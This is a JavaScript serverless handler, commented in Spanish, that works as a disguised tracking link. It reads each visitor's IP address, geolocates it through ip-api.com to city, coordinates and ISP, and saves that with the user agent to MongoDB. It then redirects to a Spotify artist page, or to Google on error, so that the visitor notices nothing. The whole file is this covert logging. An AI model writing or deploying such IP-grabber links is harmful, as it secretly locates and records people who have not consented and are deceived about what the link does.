import clientPromise from "../lib/db.js";

export default async function handler(req, res) {
  try {
    const client = await clientPromise;
    const db = client.db("ipdb");

    // 1. Obtención y limpieza de la IP del cliente
    let ip =
      req.headers["x-forwarded-for"] ||
      req.connection?.remoteAddress ||
      req.socket?.remoteAddress ||
      "";

    // Si hay varias IPs (proxies), nos quedamos con la primera
    if (ip.includes(",")) {
      ip = ip.split(",")[0].trim();
    }

    // Convertir formato IPv6 de localhost (::1) a una IP real para testeo
    if (ip === "::1" || ip === "127.0.0.1" || ip.includes("ffff:")) {
      ip = "186.157.76.46"; // IP de ejemplo (Colombia) para que no falle en local
    }

    // 2. Consulta a la API de Geolocalización (ip-api.com)
    // Usamos campos específicos para asegurar latitud y longitud
    const geoRes = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp`
    );
    
    const geo = await geoRes.json();

    // 3. Preparación de los datos (Mapeo de campos de la API a tu DB)
    const data = {
      ip: ip,
      city: geo.status === "success" ? geo.city : "Desconocido",
      region: geo.status === "success" ? geo.regionName : "Desconocido",
      country: geo.status === "success" ? geo.country : "Desconocido",
      latitude: geo.status === "success" ? geo.lat : null,
      longitude: geo.status === "success" ? geo.lon : null,
      timezone: geo.status === "success" ? geo.timezone : "UTC",
      org: geo.status === "success" ? geo.isp : "N/A",
      userAgent: req.headers["user-agent"] || "Unknown",
      date: new Date(),
    };

    // 4. Guardar en MongoDB
    await db.collection("ips").insertOne(data);

    // 5. Redirección final
    res.writeHead(302, {
      Location: "https://open.spotify.com/intl-es/artist/4IwOItqRhsIoRuD5HP4vyC?si=eY1M8B1pRbCg62plQvDO5w",
    });
    return res.end();

  } catch (err) {
    console.error("Error crítico en el servidor:", err);
    
    // Si algo falla, redirigimos igual para que el usuario no vea un error
    res.writeHead(302, {
      Location: "https://www.google.com",
    });
    return res.end();
  }
}
